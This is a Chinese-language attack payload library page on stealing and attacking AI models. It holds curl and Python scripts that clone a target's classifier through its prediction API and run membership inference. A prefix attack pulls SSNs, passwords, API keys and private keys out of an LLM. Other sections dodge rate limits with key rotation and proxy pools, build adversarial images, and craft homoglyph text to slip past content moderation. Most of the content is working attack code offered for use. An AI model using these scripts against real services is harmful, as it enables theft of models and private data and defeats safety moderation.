# 模型窃取 / 对抗样本 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:AI 模型窃取与推理攻击 + 对抗样本攻击。针对模型本身的攻击(非 prompt 层),需要查询次数 / 黑盒梯度估计等条件。

---

## A. 模型窃取与推理攻击

### AI模型窃取与推理攻击  `ai-model-extraction`
通过大量精心构造的查询对AI模型进行黑盒攻击，窃取模型参数(Model Extraction)、推断训练数据(Membership Inference)或发现模型决策边界。攻击者可以此构建功能等价的替代模型或提取隐私数据。
子类：**模型攻击** · tags: `AI` `模型窃取` `Model Extraction` `成员推断` `API滥用`

**前置条件：** 目标提供AI推理API；API返回概率/置信度分数

**攻击链：**

**1. 1. API探测与能力分析**
_分析AI API的接口格式、返回字段和可能的模型信息泄露_
```
# 分析AI API的输入输出格式
curl -X POST "https://{TARGET}/api/predict" \
  -H "Content-Type: application/json" \
  -d '{"text": "test input"}' | jq

# 检查是否返回概率分布
curl -X POST "https://{TARGET}/api/classify" \
  -H "Content-Type: application/json" \
  -d '{"text": "This is a positive review"}' | jq '.predictions'

# 测试模型信息泄露
curl "https://{TARGET}/api/model/info" 2>/dev/null | jq
curl "https://{TARGET}/api/v1/models" 2>/dev/null | jq
curl "https://{TARGET}/.well-known/ai-plugin.json" 2>/dev/null | jq
```

**2. 2. 模型窃取(Model Extraction)**
_通过大量查询训练数据集构建目标AI模型的克隆(替代)模型_
```
# 使用Knockoff Nets方法
import requests
import numpy as np
from sklearn.linear_model import LogisticRegression

def query_target(text):
    r = requests.post("https://{TARGET}/api/classify", 
                       json={"text": text})
    return r.json()["predictions"]  # [正面概率, 负面概率]

# 生成替代数据集
import random, string
queries = []
labels = []
for _ in range(10000):
    text = " ".join(random.choices(["good","bad","great","terrible",
                                     "amazing","awful","nice","poor"], k=10))
    probs = query_target(text)
    queries.append(text)
    labels.append(probs)

# 训练替代模型
from sklearn.feature_extraction.text import TfidfVectorizer
vec = TfidfVectorizer()
X = vec.fit_transform(queries)
clone = LogisticRegression().fit(X, [np.argmax(l) for l in labels])
print(f"Clone model accuracy vs target: {clone.score(X_test, y_test):.2%}")
```

**3. 3. 成员推断攻击(MIA)**
_利用模型对训练数据的过拟合特征推断特定数据是否在训练集中_
```
# 判断某条数据是否在训练集中
import requests

def membership_inference(text, threshold=0.95):
    """如果模型对输入的置信度异常高，可能是训练数据"""
    r = requests.post("https://{TARGET}/api/classify", 
                       json={"text": text})
    max_prob = max(r.json()["predictions"])
    return max_prob > threshold

# 测试已知泄露的数据
test_samples = [
    "John Smith, SSN: 123-45-6789",  # 可能在训练集中
    "Random Test User XYZ12345",     # 大概率不在训练集中
]

for sample in test_samples:
    result = membership_inference(sample)
    print(f"IN TRAINING SET: {result} -> {sample[:50]}")

# 通过损失值判断
# 训练数据的loss通常低于非训练数据
```

**4. 4. 训练数据提取**
_使用前缀攻击诱导LLM输出记忆的训练数据(可能包含PII)_
```
# 对LLM进行训练数据提取(Extracting Training Data)
# 使用前缀攻击
prefixes = [
    "My social security number is",
    "My email password is",
    "The API key is sk-",
    "BEGIN RSA PRIVATE KEY",
]

for prefix in prefixes:
    r = requests.post("https://{TARGET}/api/complete", 
                       json={"prompt": prefix, "max_tokens": 100, "temperature": 0.0})
    completion = r.json()["text"]
    print(f"Prefix: {prefix}")
    print(f"Completion: {completion}")
    # 检查是否生成了看起来真实的数据
    if any(c.isdigit() for c in completion) and len(completion) > 20:
        print("!!! POTENTIAL DATA LEAK !!!")
    print("---")

# 重复生成+去重
# 训练数据在多次生成中更可能重复出现
```

**WAF/EDR 绕过变体：**

**1. 绕过API速率限制和检测**
_使用多账号轮换、随机延迟和代理池绕过AI API的速率限制和异常检测_
```
# 多账号轮换
import itertools
api_keys = ["key1", "key2", "key3"]
key_cycle = itertools.cycle(api_keys)

# 随机化查询间隔
import time, random
time.sleep(random.uniform(1, 5))  # 1-5秒随机延迟

# 使用代理池
proxies = ["socks5://proxy1:1080", "socks5://proxy2:1080"]

# 查询多样化——避免模式检测
# 在查询中添加随机噪声
import string
noise = "".join(random.choices(string.ascii_letters, k=5))
query = f"Classify: {noise} {actual_query} {noise}"
```

---

### 对抗样本攻击  `ai-adversarial`
通过向输入数据中添加人类不可感知的微小扰动，使AI模型产生错误的预测结果。对抗样本攻击可应用于图像分类、文本分析、语音识别等多种AI模型，威胁自动驾驶、安全检测和内容审核系统。
子类：**对抗攻击** · tags: `AI` `对抗样本` `Adversarial` `FGSM` `Evasion`

**前置条件：** 目标使用AI进行自动化决策；可控制输入数据

**攻击链：**

**1. 1. 白盒攻击——FGSM**
_使用FGSM算法生成对抗样本，使图像分类模型产生错误预测_
```
# Fast Gradient Sign Method (FGSM)
import torch
import torchvision.models as models
from torchvision import transforms
from PIL import Image

model = models.resnet50(pretrained=True).eval()

def fgsm_attack(image, epsilon, data_grad):
    sign_grad = data_grad.sign()
    perturbed = image + epsilon * sign_grad
    return torch.clamp(perturbed, 0, 1)

# 加载并预处理图像
img = Image.open("cat.jpg")
transform = transforms.Compose([transforms.Resize(256), 
    transforms.CenterCrop(224), transforms.ToTensor()])
img_tensor = transform(img).unsqueeze(0)
img_tensor.requires_grad = True

# 前向传播
output = model(img_tensor)
target = output.argmax()  # 原始分类
loss = torch.nn.functional.cross_entropy(output, torch.tensor([target]))
model.zero_grad()
loss.backward()

# 生成对抗样本
adv_img = fgsm_attack(img_tensor, epsilon=0.03, data_grad=img_tensor.grad.data)
adv_output = model(adv_img)
print(f"Original: {target.item()}, Adversarial: {adv_output.argmax().item()}")
```

**2. 2. 黑盒攻击——基于查询**
_在没有模型内部信息的情况下通过查询API实现基于决策边界的黑盒对抗攻击_
```
# 黑盒对抗攻击(不需要模型内部信息)
import requests
import numpy as np
from PIL import Image

def query_model(image_bytes):
    r = requests.post("https://{TARGET}/api/classify",
                       files={"image": image_bytes})
    return r.json()["predictions"]  # {class: probability}

def boundary_attack(original_img, target_class, max_queries=5000):
    """Decision-based boundary attack"""
    # 从目标类别的图像开始
    adv = np.random.uniform(0, 255, original_img.shape).astype(np.uint8)
    
    for step in range(max_queries):
        # 逐步向原始图像靠近(保持分类为目标类)
        alpha = max(0.01, 1.0 - step/max_queries)
        candidate = (1-alpha) * original_img + alpha * adv
        candidate = candidate.astype(np.uint8)
        
        pred = query_model(to_bytes(candidate))
        if pred["class"] == target_class:
            adv = candidate
            if step % 100 == 0:
                dist = np.linalg.norm(adv.astype(float) - original_img.astype(float))
                print(f"Step {step}: distance={dist:.2f}")
    
    return adv
```

**3. 3. 文本对抗攻击**
_使用Unicode同形字替换生成视觉一致但编码不同的文本绕过AI内容审核_
```
# 文本对抗样本——绕过内容审核
import requests

# Unicode字符替换(视觉一致但编码不同)
homoglyphs = {
    "a": "\u0430",  # Cyrillic а
    "e": "\u0435",  # Cyrillic е
    "o": "\u043e",  # Cyrillic о
    "p": "\u0440",  # Cyrillic р
    "c": "\u0441",  # Cyrillic с
}

def text_adversarial(text, replace_ratio=0.3):
    result = list(text)
    for i, ch in enumerate(result):
        if ch.lower() in homoglyphs and random.random() < replace_ratio:
            result[i] = homoglyphs[ch.lower()]
    return "".join(result)

# 测试
original = "This contains harmful content"
adversarial = text_adversarial(original)
print(f"Original:    {original}")
print(f"Adversarial: {adversarial}")
print(f"Visual diff: NONE (looks identical)")

# 查询审核API
for text in [original, adversarial]:
    r = requests.post("https://{TARGET}/api/moderate", json={"text": text})
    print(f"Flagged: {r.json()[\x27flagged\x27]} -> {text[:30]}")
```

**4. 4. 物理世界对抗攻击**
_生成可打印的对抗补丁——贴在物理世界中可误导AI视觉系统_
```
# 生成对抗补丁(Adversarial Patch)
import torch
import torchvision.models as models

def generate_adversarial_patch(model, target_class, patch_size=50, epochs=500):
    """生成可打印的对抗补丁"""
    patch = torch.rand(1, 3, patch_size, patch_size, requires_grad=True)
    optimizer = torch.optim.Adam([patch], lr=0.01)
    
    for epoch in range(epochs):
        # 将patch应用到随机位置
        x, y = random.randint(0,174), random.randint(0,174)
        img = torch.rand(1, 3, 224, 224)  # 随机背景
        img[:, :, x:x+patch_size, y:y+patch_size] = patch
        
        output = model(img)
        loss = -torch.nn.functional.cross_entropy(
            output, torch.tensor([target_class]))
        
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()
        patch.data.clamp_(0, 1)
    
    return patch.detach()

# 生成能让模型将任何物体识别为"烤面包机"的补丁
patch = generate_adversarial_patch(model, target_class=859, patch_size=50)
save_image(patch, "adversarial_patch.png")
print("Print this patch and place it near target objects")
```

**WAF/EDR 绕过变体：**

**1. 绕过对抗样本防御**
_使用C&W攻击、Ensemble方法和输入多样化增强对抗样本的转移性和鲁棒性_
```
# C&W攻击——绕过防御蒸馏
# 使用更强的优化目标函数
# minimize ||delta||_2 + c * max(Z(x+delta)_t - max(Z(x+delta)_i), -kappa)

# Ensemble攻击——同时对多个模型生成对抗样本
# 转移性更强，可绕过未知模型

# 输入变换增强转移性
# DIM (Diverse Input Method)
import torchvision.transforms.functional as TF
def diverse_input(img, prob=0.5):
    if random.random() < prob:
        rnd = random.randint(200, 224)
        img = TF.resize(img, rnd)
        img = TF.pad(img, (224-rnd)//2)
    return img
```

---


---

← 回 [00-index.md](00-index.md)
